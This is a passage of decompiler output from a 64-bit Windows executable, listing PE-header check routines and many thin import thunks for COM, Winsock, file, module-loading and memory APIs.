    } while (uVar2 != 0);
  }
  return (IMAGE_SECTION_HEADER *)0x0;
}


// ==== FUN_14001616f @ 14001616f size 49

undefined2 FUN_14001616f(void)

{
  undefined2 uVar1;
  longlong lVar2;
  
  uVar1 = 0;
  if (((*(short *)PTR_IMAGE_DOS_HEADER_14002dee8 == 0x5a4d) &&
      (lVar2 = (longlong)*(int *)(PTR_IMAGE_DOS_HEADER_14002dee8 + 0x3c), uVar1 = 0,
      *(int *)(PTR_IMAGE_DOS_HEADER_14002dee8 + lVar2) == 0x4550)) &&
     (*(short *)(PTR_IMAGE_DOS_HEADER_14002dee8 + lVar2 + 0x18) == 0x20b)) {
    uVar1 = *(undefined2 *)(PTR_IMAGE_DOS_HEADER_14002dee8 + lVar2 + 6);
  }
  return uVar1;
}


// ==== FUN_1400161a0 @ 1400161a0 size 44

IMAGE_DOS_HEADER * FUN_1400161a0(void)

{
  IMAGE_DOS_HEADER *pIVar1;
  
  if (((*(short *)PTR_IMAGE_DOS_HEADER_14002dee8 != 0x5a4d) ||
      (*(int *)(PTR_IMAGE_DOS_HEADER_14002dee8 + *(int *)(PTR_IMAGE_DOS_HEADER_14002dee8 + 0x3c)) !=
       0x4550)) ||
     (pIVar1 = (IMAGE_DOS_HEADER *)PTR_IMAGE_DOS_HEADER_14002dee8,
     *(short *)(PTR_IMAGE_DOS_HEADER_14002dee8 +
               (longlong)*(int *)(PTR_IMAGE_DOS_HEADER_14002dee8 + 0x3c) + 0x18) != 0x20b)) {
    pIVar1 = (IMAGE_DOS_HEADER *)0x0;
  }
  return pIVar1;
}


// ==== FUN_1400161cc @ 1400161cc size 59

void FUN_1400161cc(undefined8 param_1,undefined8 param_2,undefined8 param_3)

{
  undefined8 *puVar1;
  
  puVar1 = (undefined8 *)FUN_140016208();
  __stdio_common_vfprintf(*puVar1,param_1,param_2,0,param_3);
  return;
}


// ==== FUN_140016208 @ 140016208 size 13

undefined * FUN_140016208(void)

{
  return &DAT_140034020;
}


// ==== CoCreateInstance @ 140016220 size 6

HRESULT __stdcall
CoCreateInstance(IID *rclsid,LPUNKNOWN pUnkOuter,DWORD dwClsContext,IID *riid,LPVOID *ppv)

{
  HRESULT HVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016220. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  HVar1 = CoCreateInstance(rclsid,pUnkOuter,dwClsContext,riid,ppv);
  return HVar1;
}


// ==== CoInitializeEx @ 140016230 size 6

HRESULT __stdcall CoInitializeEx(LPVOID pvReserved,DWORD dwCoInit)

{
  HRESULT HVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016230. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  HVar1 = CoInitializeEx(pvReserved,dwCoInit);
  return HVar1;
}


// ==== CoInitializeSecurity @ 140016240 size 6

HRESULT __stdcall
CoInitializeSecurity
          (PSECURITY_DESCRIPTOR pSecDesc,LONG cAuthSvc,SOLE_AUTHENTICATION_SERVICE *asAuthSvc,
          void *pReserved1,DWORD dwAuthnLevel,DWORD dwImpLevel,void *pAuthList,DWORD dwCapabilities,
          void *pReserved3)

{
  HRESULT HVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016240. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  HVar1 = CoInitializeSecurity
                    (pSecDesc,cAuthSvc,asAuthSvc,pReserved1,dwAuthnLevel,dwImpLevel,pAuthList,
                     dwCapabilities,pReserved3);
  return HVar1;
}


// ==== CoSetProxyBlanket @ 140016250 size 6

HRESULT __stdcall
CoSetProxyBlanket(IUnknown *pProxy,DWORD dwAuthnSvc,DWORD dwAuthzSvc,OLECHAR *pServerPrincName,
                 DWORD dwAuthnLevel,DWORD dwImpLevel,RPC_AUTH_IDENTITY_HANDLE pAuthInfo,
                 DWORD dwCapabilities)

{
  HRESULT HVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016250. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  HVar1 = CoSetProxyBlanket(pProxy,dwAuthnSvc,dwAuthzSvc,pServerPrincName,dwAuthnLevel,dwImpLevel,
                            pAuthInfo,dwCapabilities);
  return HVar1;
}


// ==== SafeArrayCreateVector @ 140016260 size 6

SAFEARRAY * __stdcall SafeArrayCreateVector(VARTYPE vt,LONG lLbound,ULONG cElements)

{
  SAFEARRAY *pSVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016260. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pSVar1 = SafeArrayCreateVector(vt,lLbound,cElements);
  return pSVar1;
}


// ==== SafeArrayDestroy @ 140016270 size 6

HRESULT __stdcall SafeArrayDestroy(SAFEARRAY *psa)

{
  HRESULT HVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016270. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  HVar1 = SafeArrayDestroy(psa);
  return HVar1;
}


// ==== SafeArrayPutElement @ 140016280 size 6

HRESULT __stdcall SafeArrayPutElement(SAFEARRAY *psa,LONG *rgIndices,void *pv)

{
  HRESULT HVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016280. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  HVar1 = SafeArrayPutElement(psa,rgIndices,pv);
  return HVar1;
}


// ==== SysAllocString @ 140016290 size 6

BSTR __stdcall SysAllocString(OLECHAR *psz)

{
  BSTR pOVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016290. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pOVar1 = SysAllocString(psz);
  return pOVar1;
}


// ==== SysFreeString @ 1400162a0 size 6

void __stdcall SysFreeString(BSTR bstrString)

{
                    /* WARNING: Could not recover jumptable at 0x0001400162a0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  SysFreeString(bstrString);
  return;
}


// ==== WSAStartup @ 1400162b0 size 6

int __stdcall WSAStartup(WORD wVersionRequired,LPWSADATA lpWSAData)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400162b0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = WSAStartup(wVersionRequired,lpWSAData);
  return iVar1;
}


// ==== GetFileVersionInfoSizeA @ 1400162c0 size 6

DWORD __stdcall GetFileVersionInfoSizeA(LPCSTR lptstrFilename,LPDWORD lpdwHandle)

{
  DWORD DVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400162c0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  DVar1 = GetFileVersionInfoSizeA(lptstrFilename,lpdwHandle);
  return DVar1;
}


// ==== BitBlt @ 1400162d0 size 6

BOOL __stdcall BitBlt(HDC hdc,int x,int y,int cx,int cy,HDC hdcSrc,int x1,int y1,DWORD rop)

{
  BOOL BVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400162d0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  BVar1 = BitBlt(hdc,x,y,cx,cy,hdcSrc,x1,y1,rop);
  return BVar1;
}


// ==== EnumWindows @ 1400162e0 size 6

BOOL __stdcall EnumWindows(WNDENUMPROC lpEnumFunc,LPARAM lParam)

{
  BOOL BVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400162e0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  BVar1 = EnumWindows(lpEnumFunc,lParam);
  return BVar1;
}


// ==== calloc @ 1400162f0 size 6

void * __cdecl calloc(size_t _Count,size_t _Size)

{
  void *pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400162f0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = calloc(_Count,_Size);
  return pvVar1;
}


// ==== free @ 140016300 size 6

void __cdecl free(void *_Memory)

{
                    /* WARNING: Could not recover jumptable at 0x000140016300. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  free(_Memory);
  return;
}


// ==== malloc @ 140016310 size 6

void * __cdecl malloc(size_t _Size)

{
  void *pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016310. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = malloc(_Size);
  return pvVar1;
}


// ==== _cexit @ 140016330 size 6

void __cdecl _cexit(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140016330. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _cexit();
  return;
}


// ==== _crt_atexit @ 140016340 size 6

void _crt_atexit(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140016340. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _crt_atexit();
  return;
}


// ==== _initterm @ 140016350 size 6

void _initterm(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140016350. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _initterm();
  return;
}


// ==== _initterm_e @ 140016360 size 6

void _initterm_e(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140016360. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _initterm_e();
  return;
}


// ==== _set_invalid_parameter_handler @ 140016370 size 6

_invalid_parameter_handler __cdecl
_set_invalid_parameter_handler(_invalid_parameter_handler _Handler)

{
  _invalid_parameter_handler p_Var1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016370. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  p_Var1 = _set_invalid_parameter_handler(_Handler);
  return p_Var1;
}


// ==== exit @ 140016380 size 6

void __cdecl exit(int _Code)

{
                    /* WARNING: Could not recover jumptable at 0x000140016380. Too many branches */
                    /* WARNING: Subroutine does not return */
                    /* WARNING: Treating indirect jump as call */
  exit(_Code);
  return;
}


// ==== __p__commode @ 140016390 size 6

void __p__commode(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140016390. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __p__commode();
  return;
}


// ==== __p__fmode @ 1400163a0 size 6

void __p__fmode(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400163a0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __p__fmode();
  return;
}


// ==== CloseHandle @ 1400163b0 size 6

BOOL __stdcall CloseHandle(HANDLE hObject)

{
  BOOL BVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400163b0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  BVar1 = CloseHandle(hObject);
  return BVar1;
}


// ==== CreateFileA @ 1400163c0 size 6

HANDLE __stdcall
CreateFileA(LPCSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,
           LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,
           DWORD dwFlagsAndAttributes,HANDLE hTemplateFile)

{
  HANDLE pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400163c0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = CreateFileA(lpFileName,dwDesiredAccess,dwShareMode,lpSecurityAttributes,
                       dwCreationDisposition,dwFlagsAndAttributes,hTemplateFile);
  return pvVar1;
}


// ==== DeleteFileA @ 1400163d0 size 6

BOOL __stdcall DeleteFileA(LPCSTR lpFileName)

{
  BOOL BVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400163d0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  BVar1 = DeleteFileA(lpFileName);
  return BVar1;
}


// ==== FreeLibrary @ 1400163e0 size 6

BOOL __stdcall FreeLibrary(HMODULE hLibModule)

{
  BOOL BVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400163e0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  BVar1 = FreeLibrary(hLibModule);
  return BVar1;
}


// ==== GetCurrentProcess @ 1400163f0 size 6

HANDLE __stdcall GetCurrentProcess(void)

{
  HANDLE pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400163f0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = GetCurrentProcess();
  return pvVar1;
}


// ==== GetCurrentProcessId @ 140016400 size 6

DWORD __stdcall GetCurrentProcessId(void)

{
  DWORD DVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016400. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  DVar1 = GetCurrentProcessId();
  return DVar1;
}


// ==== GetEnvironmentVariableA @ 140016410 size 6

DWORD __stdcall GetEnvironmentVariableA(LPCSTR lpName,LPSTR lpBuffer,DWORD nSize)

{
  DWORD DVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016410. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  DVar1 = GetEnvironmentVariableA(lpName,lpBuffer,nSize);
  return DVar1;
}


// ==== GetFileAttributesA @ 140016420 size 6

DWORD __stdcall GetFileAttributesA(LPCSTR lpFileName)

{
  DWORD DVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016420. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  DVar1 = GetFileAttributesA(lpFileName);
  return DVar1;
}


// ==== GetFileSize @ 140016430 size 6

DWORD __stdcall GetFileSize(HANDLE hFile,LPDWORD lpFileSizeHigh)

{
  DWORD DVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016430. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  DVar1 = GetFileSize(hFile,lpFileSizeHigh);
  return DVar1;
}


// ==== GetLastError @ 140016440 size 6

DWORD __stdcall GetLastError(void)

{
  DWORD DVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016440. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  DVar1 = GetLastError();
  return DVar1;
}


// ==== GetModuleFileNameA @ 140016450 size 6

DWORD __stdcall GetModuleFileNameA(HMODULE hModule,LPSTR lpFilename,DWORD nSize)

{
  DWORD DVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016450. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  DVar1 = GetModuleFileNameA(hModule,lpFilename,nSize);
  return DVar1;
}


// ==== GetModuleFileNameW @ 140016460 size 6

DWORD __stdcall GetModuleFileNameW(HMODULE hModule,LPWSTR lpFilename,DWORD nSize)

{
  DWORD DVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016460. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  DVar1 = GetModuleFileNameW(hModule,lpFilename,nSize);
  return DVar1;
}


// ==== GetModuleHandleA @ 140016470 size 6

HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)

{
  HMODULE pHVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016470. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pHVar1 = GetModuleHandleA(lpModuleName);
  return pHVar1;
}


// ==== GetProcAddress @ 140016480 size 6

FARPROC __stdcall GetProcAddress(HMODULE hModule,LPCSTR lpProcName)

{
  FARPROC pFVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016480. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pFVar1 = GetProcAddress(hModule,lpProcName);
  return pFVar1;
}


// ==== GetSystemDirectoryA @ 140016490 size 6

UINT __stdcall GetSystemDirectoryA(LPSTR lpBuffer,UINT uSize)

{
  UINT UVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016490. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  UVar1 = GetSystemDirectoryA(lpBuffer,uSize);
  return UVar1;
}


// ==== GetTempPathA @ 1400164a0 size 6

DWORD __stdcall GetTempPathA(DWORD nBufferLength,LPSTR lpBuffer)

{
  DWORD DVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400164a0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  DVar1 = GetTempPathA(nBufferLength,lpBuffer);
  return DVar1;
}


// ==== GetTickCount @ 1400164b0 size 6

DWORD __stdcall GetTickCount(void)

{
  DWORD DVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400164b0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  DVar1 = GetTickCount();
  return DVar1;
}


// ==== GetWindowsDirectoryA @ 1400164c0 size 6

UINT __stdcall GetWindowsDirectoryA(LPSTR lpBuffer,UINT uSize)

{
  UINT UVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400164c0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  UVar1 = GetWindowsDirectoryA(lpBuffer,uSize);
  return UVar1;
}


// ==== LoadLibraryA @ 1400164d0 size 6

HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName)

{
  HMODULE pHVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400164d0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pHVar1 = LoadLibraryA(lpLibFileName);
  return pHVar1;
}


// ==== LoadLibraryExA @ 1400164e0 size 6

HMODULE __stdcall LoadLibraryExA(LPCSTR lpLibFileName,HANDLE hFile,DWORD dwFlags)

{
  HMODULE pHVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400164e0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pHVar1 = LoadLibraryExA(lpLibFileName,hFile,dwFlags);
  return pHVar1;
}


// ==== LocalFree @ 1400164f0 size 6

HLOCAL __stdcall LocalFree(HLOCAL hMem)

{
  HLOCAL pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400164f0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = LocalFree(hMem);
  return pvVar1;
}


// ==== ReadFile @ 140016500 size 6

BOOL __stdcall
ReadFile(HANDLE hFile,LPVOID lpBuffer,DWORD nNumberOfBytesToRead,LPDWORD lpNumberOfBytesRead,
        LPOVERLAPPED lpOverlapped)

{
  BOOL BVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016500. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  BVar1 = ReadFile(hFile,lpBuffer,nNumberOfBytesToRead,lpNumberOfBytesRead,lpOverlapped);
  return BVar1;
}


// ==== Wow64DisableWow64FsRedirection @ 140016510 size 6

BOOL __stdcall Wow64DisableWow64FsRedirection(PVOID *OldValue)

{
  BOOL BVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016510. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  BVar1 = Wow64DisableWow64FsRedirection(OldValue);
  return BVar1;
}


// ==== Wow64RevertWow64FsRedirection @ 140016520 size 6

BOOL __stdcall Wow64RevertWow64FsRedirection(PVOID OlValue)

{
  BOOL BVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016520. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  BVar1 = Wow64RevertWow64FsRedirection(OlValue);
  return BVar1;
}


// ==== WriteFile @ 140016530 size 6

BOOL __stdcall
WriteFile(HANDLE hFile,LPCVOID lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,
         LPOVERLAPPED lpOverlapped)

{
  BOOL BVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016530. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  BVar1 = WriteFile(hFile,lpBuffer,nNumberOfBytesToWrite,lpNumberOfBytesWritten,lpOverlapped);
  return BVar1;
}


// ==== NtAllocateVirtualMemory @ 140016540 size 6

void NtAllocateVirtualMemory(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140016540. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  NtAllocateVirtualMemory();
  return;
}


// ==== NtFreeVirtualMemory @ 140016550 size 6

void NtFreeVirtualMemory(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140016550. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  NtFreeVirtualMemory();
  return;
}


// ==== _initialize_narrow_environment @ 140016560 size 6

void _initialize_narrow_environment(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140016560. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _initialize_narrow_environment();
  return;
}


// ==== _configure_narrow_argv @ 140016570 size 6

void _configure_narrow_argv(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140016570. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _configure_narrow_argv();
  return;
}


// ==== __p___argc @ 140016580 size 6

void __p___argc(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140016580. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __p___argc();
  return;
}


// ==== __p___argv @ 140016590 size 6

void __p___argv(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140016590. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __p___argv();
  return;
}


// ==== __p__environ @ 1400165a0 size 6

void __p__environ(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400165a0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __p__environ();
  return;
}


// ==== _set_new_mode @ 1400165b0 size 6

void _set_new_mode(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400165b0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _set_new_mode();
  return;
}


// ==== signal @ 1400165c0 size 6

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void signal(int param_1)

{
                    /* WARNING: Could not recover jumptable at 0x0001400165c0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  signal(param_1);
  return;
}


// ==== __setusermatherr @ 1400165d0 size 6

void __setusermatherr(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400165d0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __setusermatherr();
  return;
}


// ==== __acrt_iob_func @ 1400165e0 size 6

void __acrt_iob_func(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400165e0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __acrt_iob_func();
  return;
}


// ==== _exit @ 1400165f0 size 6

void __cdecl _exit(int _Code)

{
                    /* WARNING: Could not recover jumptable at 0x0001400165f0. Too many branches */
                    /* WARNING: Subroutine does not return */
                    /* WARNING: Treating indirect jump as call */
  _exit(_Code);
  return;
}


// ==== fwrite @ 140016600 size 6

size_t __cdecl fwrite(void *_Str,size_t _Size,size_t _Count,FILE *_File)

{
  size_t sVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016600. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  sVar1 = fwrite(_Str,_Size,_Count,_File);
  return sVar1;
}


// ==== abort @ 140016610 size 6

void __cdecl abort(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140016610. Too many branches */
                    /* WARNING: Subroutine does not return */
                    /* WARNING: Treating indirect jump as call */
  abort();
  return;
}


// ==== _set_app_type @ 140016620 size 6

void _set_app_type(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140016620. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _set_app_type();
  return;
}


// ==== __stdio_common_vfprintf @ 140016630 size 6

void __stdio_common_vfprintf(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140016630. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __stdio_common_vfprintf();
  return;
}


